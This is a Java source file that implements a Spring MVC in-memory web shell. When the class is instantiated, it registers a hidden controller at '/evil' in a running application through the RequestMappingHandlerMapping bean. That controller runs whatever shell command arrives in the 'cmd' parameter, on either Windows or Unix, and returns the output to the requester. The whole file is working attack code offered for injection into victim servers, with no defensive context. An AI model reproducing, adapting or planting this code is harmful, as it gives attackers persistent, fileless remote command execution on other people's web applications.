package xyz.eki.marshalexp.memshell;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;

public class MSpringController3 {
    public MSpringController3() throws Exception{
        System.out.println("start Injecting");
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Method method = MSpringController3.class.getMethod("test");
        PatternsRequestCondition url = new PatternsRequestCondition("/evil");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

        MSpringController3 springBootMemoryShellOfController = new MSpringController3("aaaaaaa");
        mappingHandlerMapping.registerMapping(info, springBootMemoryShellOfController, method);
        System.out.println("Injecting done");
    }

    public MSpringController3(String test){

    }

    public void test(){
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        String command = request.getParameter("cmd");
        if(command != null){
            try {
                java.io.PrintWriter printWriter = response.getWriter();
                String o = "";
                ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", command});
                }else{
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", command});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                printWriter.write(o);
                printWriter.flush();
                printWriter.close();
            }catch (Exception ignored){

            }
        }
    }
}
